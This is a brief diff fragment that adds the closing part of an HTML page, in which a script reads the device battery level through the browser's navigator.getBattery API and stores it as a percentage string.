+        // BATTERIE
+        // ============================================================
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                batteryLevel = Math.round(battery.level * 100) + '%';
+            });
+        }
+    </script>
+
+</body>
+  </html>
